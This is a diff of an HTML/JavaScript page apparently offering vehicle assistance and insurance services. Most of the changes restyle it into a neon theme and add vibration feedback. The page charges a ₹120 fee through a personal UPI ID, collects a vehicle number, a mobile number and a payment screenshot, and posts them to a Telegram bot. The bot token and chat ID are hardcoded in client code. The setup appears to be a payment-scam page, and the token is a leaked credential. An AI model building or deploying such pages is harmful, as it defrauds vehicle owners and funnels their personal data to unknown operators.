@@ -9,61 +9,60 @@
 *{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial}
 
 body{
-background:#f4f6f9;
 min-height:100vh;
-color:#1a1a1a;
+background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#1c92d2);
+background-size:400% 400%;
+animation:rgbMove 12s ease infinite;
+color:#fff;
 }
 
-/* TOP BAR */
+@keyframes rgbMove{
+0%{background-position:0% 50%}
+50%{background-position:100% 50%}
+100%{background-position:0% 50%}
+}
+
 .topbar{
 position:fixed;
 top:0;
 left:0;
 width:100%;
 height:60px;
-background:#ffffff;
+background:rgba(0,0,0,0.4);
 display:flex;
 align-items:center;
 justify-content:space-between;
 padding:0 20px;
-box-shadow:0 2px 12px rgba(0,0,0,0.08);
+backdrop-filter:blur(8px);
 z-index:1000;
 }
 
 .topbar button{
 padding:8px 16px;
 border:none;
-border-radius:6px;
-background:#005BAC;
-color:#fff;
+border-radius:8px;
+background:#00f2fe;
+color:#000;
 font-weight:600;
 cursor:pointer;
-transition:0.2s;
-}
-
-.topbar button:active{
-transform:scale(0.96);
 }
 
 .menu-icon div{
-width:24px;
+width:25px;
 height:3px;
-background:#005BAC;
+background:#fff;
 margin:4px 0;
-border-radius:3px;
 }
 
-/* SIDE MENU */
 .sideMenu{
 position:fixed;
 right:-260px;
 top:0;
 width:250px;
 height:100%;
-background:#ffffff;
+background:#111;
 padding-top:80px;
-transition:0.3s;
-box-shadow:-4px 0 20px rgba(0,0,0,0.1);
+transition:0.4s;
 z-index:999;
 }
 
@@ -73,102 +72,64 @@ margin:10px 5%;
 padding:12px;
 border:none;
 border-radius:8px;
-background:#005BAC;
+background:#1c92d2;
 color:#fff;
-font-weight:500;
 cursor:pointer;
-transition:0.2s;
-}
-
-.sideMenu button:hover{
-background:#004a94;
 }
 
 .openMenu{right:0}
 
-/* CARD */
 .card{
 margin-top:120px;
 width:92%;
 max-width:420px;
 margin-left:auto;
 margin-right:auto;
-background:#ffffff;
+background:rgba(255,255,255,0.1);
 padding:30px;
-border-radius:14px;
-box-shadow:0 8px 30px rgba(0,0,0,0.08);
+border-radius:18px;
+backdrop-filter:blur(10px);
 text-align:center;
-}
-
-h3{
-margin-bottom:15px;
-color:#003366;
 }
 
 input{
 width:100%;
 padding:14px;
-margin-top:12px;
-border-radius:8px;
-border:1px solid #dcdcdc;
+margin-top:14px;
+border-radius:10px;
+border:none;
 font-size:15px;
 text-transform:uppercase;
 }
 
-input:focus{
-border-color:#005BAC;
-outline:none;
-}
-
-/* PRIMARY BUTTON */
-.primaryBtn{
+.neonBtn{
 width:100%;
 padding:14px;
 margin-top:14px;
 border:none;
-border-radius:8px;
+border-radius:10px;
 font-weight:600;
 cursor:pointer;
-background:#005BAC;
+background:#000;
 color:#fff;
-transition:0.2s;
+animation:neon 2s infinite alternate;
 }
 
-.primaryBtn:hover{
-background:#004a94;
+@keyframes neon{
+0%{box-shadow:0 0 10px #00f2fe}
+50%{box-shadow:0 0 20px #ff00ff}
+100%{box-shadow:0 0 20px #43e97b}
 }
 
-.primaryBtn:active{
-transform:scale(0.96);
-}
+.neonBtn:active{transform:scale(0.95)}
 
-/* OUTLINE BUTTON */
-.outlineBtn{
-width:100%;
-padding:14px;
-margin-top:14px;
-border-radius:8px;
-border:2px solid #005BAC;
-background:#fff;
-color:#005BAC;
-font-weight:600;
-cursor:pointer;
-transition:0.2s;
-}
-
-.outlineBtn:hover{
-background:#005BAC;
-color:#fff;
-}
-
-/* LOADER */
 .loader{
 position:fixed;
 top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(255,255,255,0.9);
+background:rgba(0,0,0,0.8);
 display:none;
 align-items:center;
 justify-content:center;
@@ -177,23 +138,17 @@ z-index:2000;
 }
 
 .spinner{
-width:50px;
-height:50px;
-border:5px solid #ddd;
-border-top:5px solid #005BAC;
+width:60px;
+height:60px;
+border:6px solid #fff;
+border-top:6px solid #00f2fe;
 border-radius:50%;
 animation:spin 1s linear infinite;
 }
 
-@keyframes spin{
-100%{transform:rotate(360deg)}
-}
+@keyframes spin{100%{transform:rotate(360deg)}}
 
-.progress{
-margin-top:15px;
-font-weight:600;
-color:#005BAC;
-}
+.progress{margin-top:15px;font-size:18px}
 
 .hidden{display:none}
 
@@ -202,14 +157,10 @@ text-align:center;
 margin-top:40px;
 padding:20px;
 font-size:14px;
-color:#666;
+opacity:0.8;
 }
 
-.qr{
-width:160px;
-margin-top:15px;
-}
-
+.qr{width:180px;margin-top:15px}
 .section{padding:10px}
 
 </style>
@@ -240,14 +191,14 @@ margin-top:15px;
 <div id="homePage">
 <h3>Enter Vehicle Number</h3>
 <input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
-<button class="primaryBtn" onclick="goPay()">Continue</button>
+<button class="neonBtn" onclick="goPay()">Continue</button>
 </div>
 
 <div id="payPage" class="hidden">
 <h3>Service Fee ₹120</h3>
 
-<button class="primaryBtn"
-onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
+<button class="neonBtn"
+onclick="vibrate(); window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
 Pay with UPI
 </button>
 
@@ -257,20 +208,20 @@ src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=
 <input id="mobile" placeholder="Mobile Number">
 <input type="file" id="proof">
 
-<button class="primaryBtn" onclick="submitForm()">Submit</button>
-<button class="outlineBtn" onclick="goHome()">Back</button>
+<button class="neonBtn" onclick="submitForm()">Submit</button>
+<button class="neonBtn" onclick="goHome()">Back</button>
 </div>
 
 <div id="aboutPage" class="hidden section">
 <h3>About</h3>
 <p>We provide vehicle assistance and insurance related services.</p>
-<button class="outlineBtn" onclick="goHome()">Back</button>
+<button class="neonBtn" onclick="goHome()">Back</button>
 </div>
 
 <div id="disclaimerPage" class="hidden section">
 <h3>Disclaimer</h3>
-<p>This is a private assistance platform. Not affiliated with any government authority.</p>
-<button class="outlineBtn" onclick="goHome()">Back</button>
+<p>This is a private assistance platform. We are not affiliated with any government authority.</p>
+<button class="neonBtn" onclick="goHome()">Back</button>
 </div>
 
 </div>
@@ -284,9 +235,12 @@ src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=
 const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
 const chatId="5600045707";
 
+function vibrate(){if(navigator.vibrate) navigator.vibrate(80);}
+
 function toggleMenu(){menu.classList.toggle("openMenu");}
 
 function goHome(){
+vibrate();
 homePage.classList.remove("hidden");
 payPage.classList.add("hidden");
 aboutPage.classList.add("hidden");
@@ -294,6 +248,7 @@ disclaimerPage.classList.add("hidden");
 }
 
 function openInsurance(){
+vibrate();
 loader.style.display="flex";
 progressText.innerText="Loading...";
 setTimeout(()=>{
@@ -302,21 +257,29 @@ window.location.href="https://insurancebju.blogspot.com/2025/11/blog-post_17.htm
 }
 
 function openAbout(){
+vibrate();
 homePage.classList.add("hidden");
+payPage.classList.add("hidden");
 aboutPage.classList.remove("hidden");
+disclaimerPage.classList.add("hidden");
 }
 
 function openDisclaimer(){
+vibrate();
 homePage.classList.add("hidden");
+payPage.classList.add("hidden");
+aboutPage.classList.add("hidden");
 disclaimerPage.classList.remove("hidden");
 }
 
 function openContact(){
+vibrate();
 window.location.href="https://t.me/yourtelegramusername";
 }
 
 function goPay(){
 if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
+vibrate();
 homePage.classList.add("hidden");
 payPage.classList.remove("hidden");
 }
@@ -333,6 +296,7 @@ function submitForm(){
 if(mobile.value.length<10){alert("Enter valid mobile");return;}
 if(!proof.files[0]){alert("Upload screenshot");return;}
 
+vibrate();
 loader.style.display="flex";
 let percent=0;
 let interval=setInterval(()=>{
@@ -354,12 +318,12 @@ data.append("photo",proof.files[0]);
 fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{method:"POST",body:data})
 .then(()=>{
 loader.style.display="none";
-alert("Submitted Successfully");
+alert("✅ Submitted Successfully");
 goHome();
 })
 .catch(()=>{
 loader.style.display="none";
-alert("Submission Failed");
+alert("❌ Submission Failed");
 });
 }
 
